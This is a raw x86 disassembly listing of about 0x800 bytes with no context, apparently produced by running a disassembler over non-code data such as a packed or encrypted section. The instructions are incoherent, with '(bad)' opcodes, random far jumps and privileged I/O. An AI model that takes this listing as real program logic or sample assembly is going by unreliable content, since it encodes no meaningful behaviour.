  4027a2:	ins    DWORD PTR es:[edi],dx
  4027a3:	mov    esi,0xf7007950
  4027a8:	gs or  al,0x5e
  4027ab:	call   0x254e:0xc218e92e
  4027b2:	mov    edx,0xdfbc39ee
  4027b7:	mov    edx,0xb1f310db
  4027bc:	jns    0x4027d6
  4027be:	adc    DWORD PTR [esi+0x35df0c7f],esi
  4027c4:	fst    DWORD PTR [esi+0x6b5ef18b]
  4027ca:	js     0x402804
  4027cc:	jmp    0x1ce3:0xfe34df76
  4027d3:	add    eax,0xc97ff78f
  4027d8:	imul   edi,ecx,0x2a1922a2
  4027de:	xchg   ebx,eax
  4027df:	sbb    al,0xf
  4027e1:	mov    bh,BYTE PTR [ebp+0x1c]
  4027e4:	and    BYTE PTR ds:0xe10f783f,al
  4027ea:	mov    esi,0x8ce4a09
  4027ef:	retf   
  4027f0:	jmp    0x402788
  4027f2:	jns    0x40279a
  4027f4:	pop    eax
  4027f5:	cmp    edi,esp
  4027f7:	mov    edx,0x976d7238
  4027fc:	jne    0x4027f8
  4027fe:	outs   dx,BYTE PTR ds:[esi]
  4027ff:	push   edx
  402800:	inc    edi
  402801:	rcl    BYTE PTR [esi-0x37c54cef],0x44
  402808:	jne    0x4027e2
  40280a:	add    BYTE PTR [ebp+0x7bc52af0],bl
  402810:	adc    BYTE PTR [ecx-0x69058b6f],bh
  402816:	outs   dx,BYTE PTR ds:[esi]
  402817:	mov    ds:0x4ba63b0d,al
  40281c:	jnp    0x4027e3
  40281e:	hlt    
  40281f:	fldenv ds:0x86985c3f
  402825:	ja     0x402864
  402827:	and    eax,0x4cbb165a
  40282c:	push   eax
  40282d:	xlat   BYTE PTR ds:[ebx]
  40282e:	jge    0x402856
  402830:	stos   BYTE PTR es:[edi],al
  402831:	pusha  
  402832:	and    DWORD PTR [esi+0x64c02eb0],ecx
  402838:	inc    ebp
  402839:	xlat   BYTE PTR ds:[ebx]
  40283a:	xchg   BYTE PTR [edi],cl
  40283c:	int3   
  40283d:	shl    DWORD PTR [edi+0x33],1
  402840:	shl    BYTE PTR fs:[edx-0x7a],0x48
  402845:	sahf   
  402846:	xlat   BYTE PTR ds:[ebx]
  402847:	repnz ficomp DWORD PTR [esp+eax*1+0x1c]
  40284c:	mov    ds:0xf10e273,eax
  402851:	lods   al,BYTE PTR ds:[esi]
  402852:	addr16 call 0x60f7:0x169a7a9
  40285a:	mov    bh,0xa
  40285c:	scas   eax,DWORD PTR es:[edi]
  40285d:	das    
  40285e:	xchg   edi,eax
  40285f:	mov    dh,0xcb
  402861:	(bad)  
  402862:	in     al,0x28
  402864:	cdq    
  402865:	push   esp
  402866:	jecxz  0x40283a
  402868:	push   ds
  402869:	xlat   BYTE PTR ds:[ebx]
  40286a:	fwait
  40286b:	or     BYTE PTR [ecx-0x5ec30b8f],dh
  402871:	out    0x54,al
  402873:	or     DWORD PTR [ecx+0x29180990],esp
  402879:	push   ss
  40287a:	popf   
  40287b:	mov    eax,ds:0xd0428ee9
  402880:	push   ecx
  402881:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402882:	xlat   BYTE PTR ds:[ebx]
  402883:	lods   eax,DWORD PTR ds:[esi]
  402884:	push   0x7646a1fc
  402889:	add    dh,BYTE PTR [edi]
  40288b:	rcl    DWORD PTR [ebp-0x77fbc8c7],1
  402891:	cdq    
  402892:	jg     0x4028d5
  402894:	imul   edx,DWORD PTR [ecx],0xac1a68d8
  40289a:	pop    esi
  40289b:	inc    esp
  40289d:	inc    eax
  40289e:	data16 gs sbb dh,ch
  4028a2:	fiadd  DWORD PTR [esi-0x2d]
  4028a5:	fs repnz loope 0x402894
  4028a9:	add    al,0xa
  4028ab:	jae    0x402898
  4028ad:	sbb    BYTE PTR [edi],bh
  4028af:	mov    esi,0x7c38c5ee
  4028b4:	push   ebp
  4028b5:	sbb    eax,0xecb31530
  4028ba:	jl     0x4028d6
  4028bc:	adc    esp,DWORD PTR [edx+0x5]
  4028bf:	ja     0x40284e
  4028c1:	outs   dx,BYTE PTR ds:[esi]
  4028c2:	cmp    ah,BYTE PTR [ebx-0x27]
  4028c5:	test   BYTE PTR [ebx-0x434b2189],0xc6
  4028cc:	into   
  4028cd:	sbb    edx,ecx
  4028cf:	cmp    DWORD PTR [edi],ebp
  4028d1:	jo     0x4028fe
  4028d3:	sti    
  4028d4:	jb     0x40287f
  4028d6:	clc    
  4028d7:	call   0x38cbdcce
  4028dc:	addr16 cmp ebx,edx
  4028df:	mov    al,ds:0x95118c2f
  4028e4:	jnp    0x4028ee
  4028e6:	mov    ebp,0x4d716a06
  4028eb:	outs   dx,BYTE PTR ds:[esi]
  4028ec:	xor    DWORD PTR [ecx-0x6ffae39e],esp
  4028f2:	into   
  4028f3:	inc    edx
  4028f4:	inc    eax
  4028f5:	pop    es
  4028f6:	aas    
  4028f7:	push   ecx
  4028f8:	xchg   esi,eax
  4028f9:	xchg   esi,eax
  4028fa:	ins    BYTE PTR es:[edi],dx
  4028fb:	cmp    DWORD PTR [ebx+0x2a8eed4c],esi
  402901:	jmp    FWORD PTR [edx-0x2da1d07e]
  402907:	or     al,dl
  402909:	sub    BYTE PTR [ebx],bh
  40290b:	jecxz  0x402969
  40290d:	test   DWORD PTR [edx+0x20],ebp
  402910:	out    dx,eax
  402911:	dec    esi
  402912:	add    ebx,DWORD PTR [ebx-0x49ef7a60]
  402918:	mov    dh,BYTE PTR [edx]
  40291a:	cmp    DWORD PTR [edi+0x4d],esp
  40291d:	in     eax,0x94
  40291f:	push   edx
  402920:	leave  
  402921:	adc    eax,ecx
  402923:	sbb    edi,DWORD PTR [edx]
  402925:	repnz call 0xcfd7:0x4d0ca8e8
  40292d:	pop    ss
  40292e:	call   DWORD PTR [esi+eiz*2]
  402931:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402932:	add    DWORD PTR [edi+0x321afa91],0x8061aa97
  40293c:	fmul   st,st(6)
  40293e:	push   esp
  40293f:	loop   0x4028f3
  402941:	jae    0x4029b3
  402943:	mov    fs,WORD PTR [ecx]
  402945:	popa   
  402946:	fisubr WORD PTR [edx+edi*1+0x79]
  40294a:	cwde   
  40294b:	addr16 sbb eax,0xd7706878
  402951:	mov    edi,0xe012ed3d
  402956:	jle    0x402947
  402958:	fldenv [ecx-0x73]
  40295b:	ret    0x8778
  40295e:	pop    esi
  40295f:	les    ebp,FWORD PTR [ebx+ebp*2-0xf]
  402963:	xchg   edx,eax
  402964:	sub    ah,BYTE PTR [ecx]
  402966:	mov    edi,0x46f68f10
  40296b:	push   es
  40296c:	(bad)  
  40296d:	test   esi,ebp
  40296f:	mov    bl,0x67
  402971:	stos   DWORD PTR es:[edi],eax
  402972:	xchg   edi,eax
  402973:	cmp    edx,DWORD PTR [edx]
  402975:	mov    ecx,0xbe089658
  40297a:	add    eax,DWORD PTR [edx+0x5a]
  40297d:	sub    eax,DWORD PTR [eax]
  40297f:	cwde   
  402980:	aas    
  402981:	push   es
  402982:	comiss xmm6,xmm0
  402985:	sbb    al,0x5
  402987:	and    al,0x44
  402989:	mov    dl,0x8a
  40298b:	test   al,0xff
  40298d:	retf   0x847a
  402990:	out    0x1c,eax
  402992:	out    dx,eax
  402993:	icebp  
  402994:	jl     0x4029a5
  402996:	sub    DWORD PTR [eiz*1-0x1102dd9e],ebp
  40299d:	stc    
  40299e:	fcmovnu st,st(4)
  4029a0:	call   0x1b9ed4e4
  4029a5:	pop    ds
  4029a6:	int3   
  4029a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029a9:	ja     0x4029f7
  4029ab:	cmp    eax,0xc777b9ca
  4029b0:	mov    WORD PTR [ebx],cs
  4029b2:	mov    cl,0x78
  4029b4:	xchg   al,ah
  4029b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029b7:	mov    DWORD PTR ds:[edi],esp
  4029ba:	nop
  4029bb:	adc    BYTE PTR [ebx+0x3173a150],bh
  4029c1:	loop   0x4029a5
  4029c3:	test   al,0x3f
  4029c5:	adc    DWORD PTR [ecx-0x1ca10d1d],ecx
  4029cb:	add    ecx,DWORD PTR [eax+eax*4-0x66fb98ac]
  4029d2:	xor    eax,0x2f8ae170
  4029d7:	push   cs
  4029d8:	adc    al,0xfc
  4029da:	ins    BYTE PTR es:[edi],dx
  4029db:	loopne 0x40298c
  4029dd:	repz and BYTE PTR [edx],cl
  4029e0:	add    edx,DWORD PTR [ebp+0x1d]
  4029e3:	fs push esp
  4029e5:	jne    0x4029b0
  4029e7:	aaa    
  4029e8:	adc    al,0x82
  4029ea:	xchg   esi,eax
  4029eb:	ds in  al,0xcb
  4029ee:	mov    bl,0x2c
  4029f0:	and    ch,BYTE PTR [esi]
  4029f2:	shl    bl,0xf1
  4029f5:	repnz sar DWORD PTR [ecx+0xdae082f],cl
  4029fc:	add    eax,0x426d1ab1
  402a01:	out    0x21,al
  402a03:	mov    esi,0xab0383b9
  402a08:	pop    eax
  402a09:	stos   DWORD PTR es:[edi],eax
  402a0a:	mov    bl,0x72
  402a0c:	bound  ebp,QWORD PTR [esi+ebp*2-0x24dad92f]
  402a13:	inc    ecx
  402a14:	mov    al,ds:0xad4c1729
  402a19:	jge    0x402a06
  402a1b:	pop    ebx
  402a1c:	sbb    DWORD PTR [edi-0x38],esp
  402a1f:	push   cs
  402a20:	gs inc edi
  402a22:	xchg   esi,eax
  402a23:	jmp    0xe297:0xf5daff60
  402a2a:	cs push ebx
  402a2c:	pop    esi
  402a2d:	push   cs
  402a2e:	cwde   
  402a2f:	pop    ss
  402a30:	popa   
  402a31:	iret   
  402a32:	xor    bl,al
  402a34:	(bad)  
  402a36:	inc    edi
  402a37:	mov    edi,eax
  402a39:	mov    eax,ds:0x3e09e35a
  402a3e:	repnz xchg esi,eax
  402a40:	cmp    al,0xce
  402a42:	mov    dh,0x1
  402a44:	mov    bh,0x1b
  402a46:	(bad)  
  402a47:	retf   
  402a48:	xchg   ch,cl
  402a4a:	scas   al,BYTE PTR es:[edi]
  402a4b:	ret    
  402a4c:	xchg   edx,eax
  402a4d:	or     al,0xa6
  402a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a50:	and    DWORD PTR [eiz*1-0x33499a2e],esp
  402a57:	push   ebx
  402a58:	push   0x1b4a605d
  402a5d:	cmp    dh,ch
  402a5f:	jmp    DWORD PTR [esi]
  402a61:	and    al,0xe9
  402a63:	lahf   
  402a64:	rol    BYTE PTR [ebx+esi*4-0x14b7cc73],cl
  402a6b:	popa   
  402a6c:	mov    ch,0x59
  402a6e:	pop    ds
  402a6f:	sete   BYTE PTR [ecx+0x77c2be80]
  402a76:	outs   dx,DWORD PTR ds:[esi]
  402a77:	rcl    DWORD PTR gs:[edi-0x23],0xc6
  402a7c:	pop    es
  402a7d:	ja     0x402a5e
  402a7f:	jmp    0x402ae2
  402a81:	sbb    esi,edx
  402a83:	dec    esi
  402a84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a85:	jbe    0x402a68
  402a87:	jmp    0x1e06:0xa210b2f3
  402a8e:	int3   
  402a8f:	mov    dh,0x8
  402a91:	push   ebp
  402a92:	push   cs
  402a93:	mov    eax,ds:0x966e08b4
  402a98:	mov    eax,ds:0x355e6551
  402a9d:	xchg   BYTE PTR [edx+0xc],bh
  402aa0:	pop    ds
  402aa1:	addr16 mov bh,0x59
  402aa4:	mov    eax,0x2bc4b3a9
  402aa9:	(bad)  
  402aaa:	aas    
  402aab:	push   0x866eb673
  402ab0:	cmp    eax,0x5aba791d
  402ab5:	mov    dl,0xd4
  402ab7:	fimul  WORD PTR [ecx+esi*4-0x4420de79]
  402abe:	pop    ebp
  402ac0:	mov    eax,0x11e0849e
  402ac5:	sbb    BYTE PTR ds:0x12b4d364,ch
  402acb:	les    ebp,FWORD PTR [ebp+0x452d65a2]
  402ad1:	jge    0x402ab6
  402ad3:	jmp    0x402abf
  402ad5:	pop    eax
  402ad6:	pop    ebp
  402ad7:	mov    eax,0xaf60b45d
  402adc:	int3   
  402add:	or     cl,BYTE PTR [esi+edx*8-0x5d]
  402ae1:	or     esp,DWORD PTR [ecx+0x20]
  402ae4:	pushf  
  402ae5:	dec    edx
  402ae6:	popf   
  402ae7:	shr    DWORD PTR [edi-0xc],cl
  402aea:	in     eax,dx
  402aeb:	(bad)  
  402aec:	pop    dx
  402aee:	enter  0x4f43,0x5d
  402af2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402af3:	jo     0x402b34
  402af5:	(bad)  
  402af6:	(bad)  
  402af7:	ja     0x402b70
  402af9:	pop    ebx
  402afa:	mov    eax,ds:0x6033ed91
  402aff:	push   edx
  402b00:	push   esi
  402b01:	sbb    al,bh
  402b03:	xor    bl,bh
  402b05:	add    esp,DWORD PTR [ebx+0x48e9fc7d]
  402b0b:	test   eax,0x6ddad49e
  402b10:	sbb    dl,BYTE PTR [edi+0x6c]
  402b13:	iret   
  402b14:	ins    DWORD PTR es:[edi],dx
  402b15:	sar    DWORD PTR [edi-0x7c],cl
  402b18:	nop
  402b19:	sbb    BYTE PTR [ebx],bh
  402b1b:	sti    
  402b1c:	(bad)  
  402b1d:	aam    0xdc
  402b1f:	sub    al,0x7d
  402b21:	fldcw  WORD PTR [edx-0x7c4fec19]
  402b27:	pop    ss
  402b28:	cmp    al,0x33
  402b2a:	mov    edx,0x6e296d61
  402b2f:	inc    esi
  402b30:	fstp   st(2)
  402b32:	repnz cs pop ebx
  402b35:	enter  0x4ce6,0x6d
  402b39:	mov    ecx,0x4cdd471b
  402b3e:	repz fisttp WORD PTR ds:0xbb344106
  402b45:	or     bh,0x93
  402b48:	stc    
  402b49:	mov    edx,0xd29d599f
  402b4e:	pop    edx
  402b4f:	or     ebx,edi
  402b51:	push   ds
  402b52:	fnclex 
  402b54:	aad    0x81
  402b56:	jno    0x402b3e
  402b58:	mov    WORD PTR [ecx+ecx*1+0x2c],fs
  402b5c:	test   al,0xf8
  402b5e:	jmp    0x402bd3
  402b60:	pop    es
  402b61:	out    0x3e,al
  402b63:	mov    eax,DWORD PTR [eax+0x708a3aaf]
  402b69:	rol    BYTE PTR [ebp+ecx*1-0x6e],0xc9
  402b6e:	int    0x13
  402b70:	sub    al,0xe3
  402b72:	hlt    
  402b73:	add    al,BYTE PTR [ecx]
  402b75:	sbb    al,0x2e
  402b77:	lods   al,BYTE PTR ds:[esi]
  402b78:	xor    BYTE PTR [edi-0x44],ch
  402b7b:	add    al,0xd5
  402b7d:	sbb    al,0xf4
  402b7f:	test   BYTE PTR [ebx+eax*1-0x5336ffc9],bh
  402b86:	pushf  
  402b87:	imul   esi,DWORD PTR [ebx+0x405f053f],0x95539a1e
  402b91:	repnz aas 
  402b93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b94:	in     al,0xfb
  402b96:	push   es
  402b97:	call   0xda375e49
  402b9c:	icebp  
  402b9d:	leave  
  402b9e:	ret    0xa92
  402ba1:	xchg   esi,eax
  402ba2:	sub    eax,0x1e0d98c2
  402ba7:	sbb    eax,0xdaecbd41
  402bac:	add    esi,esp
  402bae:	pop    ebx
  402baf:	mov    ecx,0x4be9c2cf
  402bb4:	ficomp DWORD PTR [ebp+0x2a]
  402bb7:	jmp    0xc85186bf
  402bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bbd:	add    DWORD PTR [ecx],esp
  402bbf:	repnz sub DWORD PTR [ebx-0xb8c1ffc],ebx
  402bc6:	sbb    DWORD PTR [esi-0x30],ebx
  402bc9:	mov    bl,0xbb
  402bcb:	ja     0x402c01
  402bcd:	call   0xe5a6:0x280c8fb3
  402bd4:	pop    es
  402bd5:	addr16 fwait
  402bd7:	jnp    0x402c17
  402bd9:	or     al,0xe4
  402bdb:	mov    ds:0x6d79384e,al
  402be0:	adc    al,0xa2
  402be2:	popa   
  402be3:	mov    bl,0x2a
  402be5:	jbe    0x402be1
  402be7:	stc    
  402be8:	mov    ds:0xce280abb,al
  402bed:	pop    es
  402bee:	int3   
  402bef:	retf   
  402bf0:	push   edx
  402bf1:	jmp    0x56a1:0xd523f78e
  402bf8:	into   
  402bf9:	lahf   
  402bfa:	xor    eax,0x4397df5d
  402bff:	mov    eax,0x9dfce2c4
  402c04:	inc    ecx
  402c05:	clc    
  402c06:	repnz mov ss,WORD PTR [ebx+edi*4]
  402c0a:	sub    edx,DWORD PTR ds:0x27788aa1
  402c10:	cdq    
  402c11:	(bad)  [edx]
  402c13:	mov    edx,0xfe041fce
  402c18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c19:	cmp    edx,DWORD PTR [edi+0x43]
  402c1c:	sbb    bh,BYTE PTR [esi-0xd]
  402c1f:	push   ds
  402c20:	add    dh,BYTE PTR [ebx+0x7e813e64]
  402c26:	xor    al,0xa9
  402c28:	mov    al,ds:0xfd7b447a
  402c2d:	mov    fs,WORD PTR [eax]
  402c2f:	sub    DWORD PTR [eax-0x9],edx
  402c32:	cmp    esp,DWORD PTR [esi-0x3d]
  402c35:	mov    eax,ds:0x86b71974
  402c3a:	dec    eax
  402c3b:	mov    bh,0x22
  402c3d:	(bad)  
  402c3e:	iret   
  402c3f:	xor    dh,BYTE PTR [esi-0x3815019c]
  402c45:	in     eax,dx
  402c46:	out    dx,eax
  402c47:	push   ds
  402c48:	mov    DWORD PTR [ebx],ebx
  402c4a:	mov    ah,0xd0
  402c4c:	push   ecx
  402c4d:	popa   
  402c4e:	push   ebp
  402c4f:	mov    bh,BYTE PTR [esi-0x26]
  402c52:	test   al,0xb2
  402c54:	aad    0x10
  402c56:	aaa    
  402c57:	(bad)  
  402c58:	dec    eax
  402c59:	sbb    bl,BYTE PTR [ebx+0x11325181]
  402c5f:	shr    BYTE PTR [eax],cl
  402c61:	lahf   
  402c62:	aad    0x97
  402c64:	pop    esi
  402c65:	or     BYTE PTR [esi-0x73],0xd4
  402c69:	ins    BYTE PTR es:[edi],dx
  402c6a:	mov    bl,0xdc
  402c6c:	(bad)  
  402c6d:	or     ch,ch
  402c6f:	scas   al,BYTE PTR es:[edi]
  402c70:	dec    ebp
  402c71:	dec    esi
  402c72:	xor    DWORD PTR ds:0x9a115fd7,ebx
  402c78:	push   ebp
  402c79:	inc    eax
  402c7a:	jb     0x402ca5
  402c7c:	and    eax,0x9ba5a46d
  402c81:	mov    dh,0x9a
  402c83:	dec    esi
  402c84:	fs ret 0xc6bc
  402c88:	mov    ebx,DWORD PTR [eax]
  402c8a:	mov    ch,0x37
  402c8c:	out    dx,eax
  402c8d:	or     DWORD PTR [ebp-0x63],0xcbd6b0b1
  402c94:	ins    BYTE PTR es:[edi],dx
  402c95:	mov    edx,0xe6ee5fe4
  402c9a:	cmp    BYTE PTR [ebx],0x1b
  402c9d:	ret    
  402c9e:	enter  0xd251,0x22
  402ca2:	jmp    0x402c5d
  402ca4:	std    
  402ca5:	les    esi,FWORD PTR [edi-0x6224f295]
  402cab:	mov    bh,0xa0
  402cad:	add    eax,edx
  402caf:	loope  0x402d15
  402cb1:	adc    cl,dh
  402cb3:	ss fs repnz xchg ebx,eax
  402cb7:	cmp    ebx,DWORD PTR [eax+0x53e25c60]
  402cbd:	jmp    0x93b5:0xae291cbb
  402cc4:	jg     0x402c9a
  402cc6:	or     ch,BYTE PTR [eax+0xc46d8e1]
  402ccc:	sub    BYTE PTR [edi+edi*4],dl
  402ccf:	std    
  402cd0:	(bad)  
  402cd1:	fcos   
  402cd3:	das    
  402cd4:	mov    WORD PTR [ebx+edi*1+0x20c029da],?
  402cdb:	stos   BYTE PTR es:[edi],al
  402cdc:	add    bh,cl
  402cde:	js     0x402d30
  402ce0:	mov    dh,BYTE PTR [esi]
  402ce2:	jecxz  0x402ca5
  402ce4:	pop    ebx
  402ce5:	retf   
  402ce6:	mov    al,ds:0x737fddb7
  402ceb:	add    al,0x16
  402ced:	push   ebx
  402cee:	dec    esp
  402cef:	jge    0x402cd2
  402cf1:	pop    ebp
  402cf2:	adc    dh,0x3
  402cf5:	xor    dl,dl
  402cf7:	xchg   edi,eax
  402cf8:	push   ds
  402cf9:	cld    
  402cfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cfb:	push   ds
  402cfc:	sahf   
  402cfd:	pop    ebx
  402cfe:	jge    0x402ca0
  402d00:	fwait
  402d01:	hlt    
  402d02:	mov    ah,0xac
  402d04:	add    edx,edx
  402d06:	cmp    DWORD PTR [ebx],0x28
  402d09:	fdivr  QWORD PTR [edi-0x4e44454c]
  402d0f:	mov    esp,0x68cca0d8
  402d14:	into   
  402d15:	out    0xd2,al
  402d17:	rol    DWORD PTR [eax+0x4db390bc],1
  402d1d:	lods   al,BYTE PTR ds:[esi]
  402d1e:	call   0x1345:0xd5356c83
  402d25:	popa   
  402d26:	sub    cl,bh
  402d28:	mov    cl,0xb9
  402d2a:	mov    al,0x77
  402d2c:	add    ecx,DWORD PTR [ecx]
  402d2e:	inc    edx
  402d2f:	hlt    
  402d30:	sub    DWORD PTR [ebx],0x13742a4
  402d36:	mov    ecx,0xcca1f3e1
  402d3b:	popa   
  402d3c:	push   0xd82a3125
  402d41:	ror    BYTE PTR [ebp-0x54ebc394],1
  402d47:	imul   edi,DWORD PTR [eax-0x4b],0x50
  402d4b:	ror    BYTE PTR [edx-0x78a5719a],cl
  402d51:	scas   al,BYTE PTR es:[edi]
  402d52:	pop    esi
  402d53:	repz pop edi
  402d55:	and    eax,DWORD PTR [edi+0x31]
  402d58:	mov    esi,0xde004fe1
  402d5d:	retf   0x4f65
  402d60:	push   0x53
  402d62:	xchg   ecx,eax
  402d63:	rol    DWORD PTR [edx+0x83b14d2],0xd9
  402d6a:	and    eax,0xe0b02e35
  402d6f:	add    ch,bl
  402d71:	inc    edx
  402d72:	cmc    
  402d73:	int    0xf9
  402d75:	sub    edi,DWORD PTR [edx]
  402d77:	jb     0x402d70
  402d79:	sbb    DWORD PTR [edi],ecx
  402d7b:	inc    ebp
  402d7c:	enter  0xec16,0x60
  402d80:	and    BYTE PTR [ecx-0x69fc8150],al
  402d86:	xchg   esp,eax
  402d87:	mov    ds:0x643288a0,al
  402d8c:	xchg   esp,eax
  402d8d:	mov    ah,0x30
  402d8f:	popf   
  402d90:	xor    DWORD PTR [edx],ecx
  402d92:	add    DWORD PTR ds:0xfa363287,0x5f0c7a9d
  402d9c:	xchg   ebp,eax
  402d9d:	test   eax,0x420b0e2f
  402da2:	nop    ecx
  402da5:	fwait
  402da6:	lods   al,BYTE PTR ds:[esi]
  402da7:	inc    eax
  402da8:	stos   BYTE PTR es:[edi],al
  402da9:	js     0x402e24
  402dab:	mov    cl,0xc5
  402dad:	fimul  WORD PTR [esi-0x5e365746]
  402db3:	push   esi
  402db4:	fs (bad) 
  402db7:	pop    ebx
  402db8:	fwait
  402db9:	push   esi
  402dba:	leave  
  402dbb:	sub    al,0x9d
  402dbd:	test   BYTE PTR [esi+ecx*4+0x42],0x85
  402dc2:	sub    ebp,DWORD PTR [eax-0x14]
  402dc5:	and    al,0xc
  402dc7:	jl     0x402e3d
  402dc9:	jmp    0xab077143
  402dce:	fwait
  402dcf:	push   ss
  402dd0:	leave  
  402dd1:	(bad)  [esi-0x5f]
  402dd4:	ret    
  402dd5:	mov    ebx,0x4928e0b6
  402dda:	int3   
  402ddb:	dec    esp
  402ddc:	push   edi
  402ddd:	adc    al,0x57
  402ddf:	test   eax,0x60ee6a3a
  402de4:	add    eax,0x8c7eec6a
  402de9:	outs   dx,DWORD PTR ds:[esi]
  402dea:	(bad)  
  402deb:	push   esp
  402dec:	and    BYTE PTR [edx+ebx*2-0x145049a7],al
  402df3:	push   0x8
  402df5:	imul   eax,ebp,0x2
  402df8:	xor    DWORD PTR [edi+0x20],ebx
  402dfb:	mov    cl,0xc2
  402dfd:	(bad)  
  402dfe:	leave  
  402dff:	jp     0x402dad
  402e01:	add    BYTE PTR [ebx],0xc
  402e04:	jmp    0xd223:0x9776e40c
  402e0b:	enter  0xf61e,0x52
  402e0f:	lds    ebp,FWORD PTR [edi+ebx*2+0x25]
  402e13:	mov    eax,ds:0xafd8c4b
  402e18:	repnz outs dx,DWORD PTR ds:[esi]
  402e1a:	data16 je 0x402de8
  402e1d:	and    BYTE PTR [esi],0x10
  402e20:	xor    bl,al
  402e22:	scas   al,BYTE PTR es:[edi]
  402e23:	pop    ds
  402e24:	ffree  st(3)
  402e26:	mov    esi,0x1ede6970
  402e2b:	enter  0x5cfc,0xe9
  402e2f:	lods   eax,DWORD PTR ds:[esi]
  402e30:	les    ecx,FWORD PTR [edi]
  402e32:	aam    0x74
  402e34:	and    al,al
  402e36:	ret    0x2f01
  402e39:	inc    ebx
  402e3a:	(bad)  
  402e3c:	add    al,BYTE PTR [esp+edi*8+0x76dc74de]
  402e43:	adc    DWORD PTR [edi],eax
  402e45:	rcr    cl,1
  402e47:	mov    dl,0x94
  402e49:	popf   
  402e4a:	out    dx,al
  402e4b:	push   es
  402e4c:	int    0x7f
  402e4e:	ret    
  402e4f:	(bad)  
  402e50:	dec    esp
  402e51:	mov    edx,0xcba6e7ce
  402e56:	dec    edx
  402e57:	cmp    esp,DWORD PTR [edx]
  402e59:	ins    DWORD PTR es:[edi],dx
  402e5a:	loope  0x402e71
  402e5c:	push   esp
  402e5d:	les    esp,FWORD PTR [ebx-0x7a]
  402e60:	ja     0x402e27
  402e62:	pop    eax
  402e63:	pop    ebp
  402e64:	bound  esp,QWORD PTR [ecx-0x52]
  402e67:	(bad)
  402e6a:	xchg   edx,eax
  402e6b:	sbb    eax,0x3f3ff10a
  402e70:	dec    eax
  402e71:	xchg   bl,bl
  402e73:	jb     0x402e2b
  402e75:	jmp    0x7fe1:0x8667905e
  402e7c:	ret    
  402e7d:	scas   al,BYTE PTR es:[edi]
  402e7e:	retf   0xd42f
  402e81:	shr    WORD PTR [ecx+0x5b],1
  402e85:	mov    edx,edi
  402e87:	mov    WORD PTR [eax+0x178658aa],cs
  402e8d:	retf   0xec4a
  402e90:	aas    
  402e91:	or     eax,0x6e3862f6
  402e96:	les    esi,FWORD PTR [edx]
  402e98:	and    DWORD PTR [edx-0x6b],esi
  402e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e9c:	retf   
  402e9d:	icebp  
  402e9e:	sub    eax,DWORD PTR [ebx]
  402ea0:	call   0x6df322d6
  402ea5:	das    
  402ea6:	dec    ecx
  402ea7:	add    cl,BYTE PTR [ebx-0x34723e3b]
  402ead:	dec    esi
  402eae:	mov    ecx,ebx
  402eb0:	mov    ebp,0x81d77334
  402eb5:	stc    
  402eb6:	mov    esi,ebx
  402eb8:	fadd   DWORD PTR [ecx]
  402eba:	(bad)  
  402ebb:	retf   0xa893
  402ebe:	mov    bh,0x93
  402ec0:	cs pop eax
  402ec2:	cs mov dl,0x20
  402ec5:	ficom  WORD PTR [ecx]
  402ec7:	adc    al,0xb3
  402ec9:	push   ds
  402eca:	dec    edx
  402ecb:	mov    ch,0x70
  402ecd:	aad    0x4f
  402ecf:	mov    ah,0xdc
  402ed1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ed2:	mov    al,0xd7
  402ed4:	sub    al,0x4b
  402ed6:	pop    eax
  402ed7:	aaa    
  402ed8:	cmc    
  402ed9:	or     DWORD PTR ds:0x9b770c5b,edi
  402edf:	add    dl,bl
  402ee1:	out    dx,eax
  402ee2:	cmp    cl,BYTE PTR [edi+ecx*8+0x5d116351]
  402ee9:	inc    ebx
  402eea:	not    DWORD PTR [edx+0x4e84942a]
  402ef0:	mov    ebx,0xf6e4df5
  402ef5:	inc    edx
  402ef6:	push   es
  402ef7:	sbb    BYTE PTR [edx],bh
  402ef9:	call   0xb8a3:0xb2bd569c
  402f00:	out    0xc7,al
  402f02:	in     eax,dx
  402f03:	mov    dh,dh
  402f05:	mov    eax,0xd0b41255
  402f0a:	gs call 0x9f13:0x5ff1bb4a
  402f12:	or     BYTE PTR [eax+0x6a],dh
  402f15:	dec    esi
  402f16:	(bad)  
  402f17:	jb     0x402f52
  402f19:	icebp  
  402f1a:	xchg   ebx,eax
  402f1b:	xor    ah,BYTE PTR [edi]
  402f1d:	ins    DWORD PTR es:[edi],dx
  402f1e:	xchg   esi,eax
  402f1f:	rol    DWORD PTR [ecx*2-0x72d2a7b],0x16
  402f27:	je     0x402f46
  402f29:	jg     0x402f36
  402f2b:	cwde   
  402f2c:	in     eax,0x2e
  402f2e:	or     bh,al
  402f30:	jl     0x402ef0
  402f32:	dec    edi
  402f33:	push   0xb0fa9a64
  402f38:	add    al,0x97
  402f3a:	sub    BYTE PTR [eax-0x1b],bh
  402f3d:	cmp    DWORD PTR [esi-0xd],ecx
  402f40:	dec    ebx
  402f41:	push   ss
  402f42:	and    BYTE PTR [ebp+esi*1-0x13],bl
  402f46:	sbb    BYTE PTR [eax+0x3cd75365],ah
  402f4c:	icebp  
  402f4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f4e:	pop    ecx
  402f4f:	test   eax,0x5de09193
  402f54:	in     eax,dx
  402f55:	or     edi,ebp
  402f57:	data16 mov BYTE PTR [esp+ebx*8+0x16d46a54],0x88
  402f60:	enter  0x86a5,0xf0
  402f64:	jmp    0xb0b48d88
  402f69:	retf   0x5493
  402f6c:	fucomp st(2)
  402f6e:	cs jnp 0x402f99
  402f71:	test   al,0x21
  402f73:	inc    ebp
  402f74:	in     al,0x17
  402f76:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  402f78:	bound  esp,QWORD PTR [edi]
  402f7a:	xor    DWORD PTR [eax+0x6ecf2b18],ebp
  402f80:	cmp    al,0x13
  402f83:	adc    al,BYTE PTR [ebp+0x623b4cb2]
